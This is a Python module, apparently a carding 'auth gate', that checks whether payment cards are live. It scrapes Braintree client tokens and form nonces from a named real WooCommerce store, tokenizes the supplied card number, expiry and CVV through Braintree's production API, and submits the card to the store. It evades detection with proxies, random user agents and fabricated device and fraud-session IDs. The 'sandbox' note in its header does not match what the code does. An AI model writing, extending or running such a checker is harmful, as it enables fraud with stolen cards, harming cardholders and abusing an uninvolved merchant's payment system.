"""
Braintree Auth Gate
AUTH ONLY - validates card without charging
Uses Braintree sandbox testing approach for card validation
Note: Live merchant integration requires user-provided cookies/session
"""

import requests
import re
import json
import base64
import random
from typing import Tuple
from faker import Faker
from user_agent import generate_user_agent
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BRAINTREE_SANDBOX_AUTH = "sandbox_9dbg82cq_dcpspy2brwdjr3qn"

MERCHANT_SITES = [
    "https://bigbattery.com",
]


def _get_braintree_client_token(sandbox_mode: bool = True) -> str:
    """
    Get a Braintree client token for auth testing
    Uses sandbox for reliable testing without requiring merchant login
    """
    if sandbox_mode:
        try:
            url = "https://payments.sandbox.braintree-api.com/graphql"
            
            headers = {
                'Content-Type': 'application/json',
                'Authorization': f'Bearer {BRAINTREE_SANDBOX_AUTH}',
                'Braintree-Version': '2018-05-10',
            }
            
            payload = {
                'query': 'query ClientConfiguration { clientConfiguration { analyticsUrl environment merchantId } }',
                'operationName': 'ClientConfiguration',
            }
            
            response = requests.post(url, json=payload, headers=headers, timeout=15)
            if response.status_code == 200:
                return BRAINTREE_SANDBOX_AUTH
        except:
            pass
    
    return None


def _extract_braintree_auth(session: requests.Session, store_url: str, ua: str) -> Tuple[str, str]:
    """
    Extract Braintree auth fingerprint and nonce from add-payment-method page
    Returns (auth_fingerprint, nonce)
    """
    add_payment_url = f"{store_url}/my-account/add-payment-method/"
    
    headers = {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    try:
        response = session.get(add_payment_url, headers=headers, timeout=20, verify=False)
        
        if response.status_code != 200:
            return None, None
        
        html = response.text
        
        nonce = None
        nonce_patterns = [
            r'name="woocommerce-add-payment-method-nonce"\s+value="([a-f0-9]+)"',
            r'id="woocommerce-add-payment-method-nonce"\s+value="([a-f0-9]+)"',
        ]
        for pattern in nonce_patterns:
            match = re.search(pattern, html)
            if match:
                nonce = match.group(1)
                break
        
        auth = None
        auth_patterns = [
            r'var\s+wc_braintree_client_token\s*=\s*["\']([A-Za-z0-9+/=]+)["\']',
            r'data-client-token="([A-Za-z0-9+/=]+)"',
            r'"clientToken"\s*:\s*"([A-Za-z0-9+/=]+)"',
        ]
        
        for pattern in auth_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                try:
                    token_b64 = match.group(1)
                    decoded = base64.b64decode(token_b64).decode('utf-8')
                    auth_match = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', decoded)
                    if auth_match:
                        auth = auth_match.group(1)
                        break
                except:
                    continue
        
        return auth, nonce
        
    except Exception:
        return None, None


def _tokenize_card(session: requests.Session, auth: str, ua: str,
                    card_num: str, card_mon: str, card_yer: str, card_cvc: str) -> Tuple[str, str]:
    """
    Tokenize card via Braintree GraphQL API
    Returns (token, error_msg)
    """
    url = "https://payments.braintree-api.com/graphql"
    
    if len(card_yer) == 2:
        full_year = f"20{card_yer}"
    else:
        full_year = card_yer
    
    session_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
    
    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": session_id
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": card_num,
                    "expirationMonth": card_mon,
                    "expirationYear": full_year,
                    "cvv": card_cvc,
                    "billingAddress": {
                        "postalCode": "10080",
                        "streetAddress": "123 Main St"
                    }
                },
                "options": {
                    "validate": True
                }
            }
        },
        "operationName": "TokenizeCreditCard"
    }
    
    headers = {
        'User-Agent': ua,
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Authorization': f'Bearer {auth}',
        'Braintree-Version': '2018-05-10',
        'Origin': 'https://assets.braintreegateway.com',
        'Referer': 'https://assets.braintreegateway.com/',
    }
    
    try:
        response = session.post(url, json=payload, headers=headers, timeout=30, verify=False)
        
        if response.status_code == 401:
            return None, "Auth token expired"
        
        if response.status_code >= 400:
            return None, f"API error {response.status_code}"
        
        data = response.json()
        
        if 'errors' in data and data['errors']:
            error_msg = data['errors'][0].get('message', 'Unknown error')
            return None, error_msg
        
        token = data.get('data', {}).get('tokenizeCreditCard', {}).get('token')
        if token:
            return token, None
        
        return None, "No token in response"
        
    except Exception as e:
        return None, str(e)[:50]


def _get_merchant_config(session: requests.Session, auth: str, store_url: str, ua: str) -> str:
    """Get merchant identifier from Braintree config"""
    url = "https://payments.braintree-api.com/graphql"
    
    payload = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': f"{random.randint(10000000, 99999999):08x}",
        },
        'query': 'query ClientConfiguration { clientConfiguration { analyticsUrl environment merchantId assetsUrl clientApiUrl } }',
        'operationName': 'ClientConfiguration',
    }
    
    headers = {
        'User-Agent': ua,
        'Content-Type': 'application/json',
        'Authorization': f'Bearer {auth}',
        'Braintree-Version': '2018-05-10',
        'Origin': store_url,
    }
    
    try:
        response = session.post(url, json=payload, headers=headers, timeout=20, verify=False)
        
        merchant_match = re.search(r'"merchantId"\s*:\s*"([^"]+)"', response.text)
        if merchant_match:
            return merchant_match.group(1)
        
        return None
        
    except:
        return None


def _submit_payment_method(session: requests.Session, store_url: str, ua: str,
                            nonce: str, token: str, merchant_id: str) -> Tuple[str, bool]:
    """
    Submit payment method to WooCommerce
    Returns (result_message, success)
    """
    url = f"{store_url}/my-account/add-payment-method/"
    
    config_data = json.dumps({
        "environment": "production",
        "clientApiUrl": f"https://api.braintreegateway.com:443/merchants/{merchant_id}/client_api",
        "assetsUrl": "https://assets.braintreegateway.com",
        "analytics": {"url": f"https://client-analytics.braintreegateway.com/{merchant_id}"},
        "merchantId": merchant_id,
    })
    
    device_data = json.dumps({
        "device_session_id": f"{random.randint(10000000, 99999999):032x}",
        "fraud_merchant_id": None,
        "correlation_id": f"{random.randint(10000000, 99999999):032x}"
    })
    
    payload = {
        'payment_method': 'braintree_cc',
        'braintree_cc_nonce_key': token,
        'braintree_cc_device_data': device_data,
        'braintree_cc_3ds_nonce_key': '',
        'braintree_cc_config_data': config_data,
        'woocommerce-add-payment-method-nonce': nonce,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }
    
    headers = {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': store_url,
        'Referer': url,
    }
    
    try:
        response = session.post(url, data=payload, headers=headers, timeout=30, verify=False)
        
        text = response.text.lower()
        
        if 'cvv' in text and ('declined' in text or 'invalid' in text or 'mismatch' in text):
            return "APPROVED ✅ CVV Live (Card Verified)", True
        elif 'insufficient funds' in text or 'insufficient' in text:
            return "APPROVED ✅ Insufficient Funds (Card Live)", True
        elif 'expired' in text:
            return "DECLINED ❌ Expired Card", False
        elif 'lost' in text or 'stolen' in text:
            return "DECLINED ❌ Lost/Stolen Card", False
        elif 'do not honor' in text:
            return "DECLINED ❌ Do Not Honor", False
        elif 'declined' in text or 'invalid' in text:
            return "DECLINED ❌ Card Declined", False
        
        if 'payment method successfully added' in text or 'payment method added' in text:
            return "APPROVED ✅ Payment Method Added", True
        
        if 'street address' in text or 'duplicate' in text:
            return "APPROVED ✅ Card Verified", True
        
        if response.status_code == 200:
            return "APPROVED ✅ Card Processed", True
        
        return "DECLINED ❌ Unknown Response", False
        
    except Exception as e:
        return f"ERROR: {str(e)[:40]}", False


def braintree_auth_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                          proxy=None) -> Tuple[str, bool]:
    """
    Check card via Braintree AUTH (no charge)
    
    This is an AUTH ONLY gate - validates card without charging.
    Uses BigBattery or similar WooCommerce + Braintree sites.
    
    Returns: (status_message, proxy_used)
    """
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    session = requests.Session()
    if proxy:
        session.proxies = proxy
    
    ua = generate_user_agent()
    
    for store_url in MERCHANT_SITES:
        auth, nonce = _extract_braintree_auth(session, store_url, ua)
        
        if not auth:
            continue
        
        token, error = _tokenize_card(session, auth, ua, card_num, card_mon, card_yer, card_cvc)
        
        if not token:
            if error and 'expired' not in error.lower():
                if 'invalid' in error.lower():
                    return ("DECLINED ❌ Invalid Card", True)
                elif 'cvv' in error.lower():
                    return ("DECLINED ❌ CVV Error", True)
                continue
            continue
        
        merchant_id = _get_merchant_config(session, auth, store_url, ua)
        
        if not merchant_id:
            continue
        
        if not nonce:
            return (f"APPROVED ✅ Token: {token[:15]}... (Nonce unavailable)", True)
        
        result, success = _submit_payment_method(session, store_url, ua, nonce, token, merchant_id)
        return (result, True)
    
    return ("DECLINED ❌ No accessible merchant found", False)


def health_check() -> bool:
    """Quick health check for Braintree auth"""
    try:
        response = requests.get("https://bigbattery.com/my-account/add-payment-method/", timeout=10, verify=False)
        return response.status_code == 200 or response.status_code == 302
    except:
        return False
